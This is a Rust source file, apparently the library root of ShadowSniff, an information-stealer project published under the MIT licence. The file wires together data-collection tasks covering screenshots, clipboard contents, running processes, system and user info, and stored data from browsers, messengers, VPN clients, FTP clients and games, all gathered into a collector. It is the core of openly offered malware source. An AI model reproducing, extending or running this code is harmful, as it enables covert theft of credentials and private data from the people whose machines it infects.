/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */
#![doc = include_str!("../../README.md")]
#![no_std]
#![allow(unsafe_op_in_unsafe_fn)]

extern crate alloc;
mod clipboard;
mod processes;
mod screenshot;
mod systeminfo;
mod userinfo;

use crate::clipboard::ClipboardTask;
use crate::processes::ProcessesTask;
use crate::screenshot::ScreenshotTask;
use crate::systeminfo::SystemInfoTask;
use crate::userinfo::UserInfoTask;
use alloc::boxed::Box;
use alloc::vec;
use browsers::BrowsersTask;
use collector::Collector;
use filesystem::FileSystem;
use filesystem::path::Path;
use ftp::FtpTask;
use games::GamesTask;
use messengers::MessengersTask;
use tasks::{CompositeTask, Task, composite_task};
use vpn::VpnTask;

pub struct SniffTask<C: Collector, F: FileSystem> {
    inner: CompositeTask<C, F>,
    subtask: Option<Box<dyn Task<C, F>>>,
}

impl<C: Collector + 'static, F: FileSystem + 'static> Default for SniffTask<C, F> {
    fn default() -> Self {
        Self {
            inner: composite_task!(
                ScreenshotTask,
                ProcessesTask,
                SystemInfoTask,
                ClipboardTask,
                UserInfoTask,
                VpnTask::default(),
                GamesTask::default(),
                FtpTask::default(),
                MessengersTask::default(),
                BrowsersTask::default(),
            ),
            subtask: None,
        }
    }
}

impl<C: Collector + 'static, F: FileSystem + 'static> SniffTask<C, F> {
    pub fn with_subtask<T>(subtask: T) -> Self
    where
        T: Task<C, F> + 'static,
    {
        Self {
            subtask: Some(Box::new(subtask)),
            ..Self::default()
        }
    }
}

impl<C: Collector, F: FileSystem> Task<C, F> for SniffTask<C, F> {
    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        self.inner.run(parent, filesystem, collector);

        if let Some(subtask) = &self.subtask {
            subtask.run(parent, filesystem, collector);
        }
    }
}
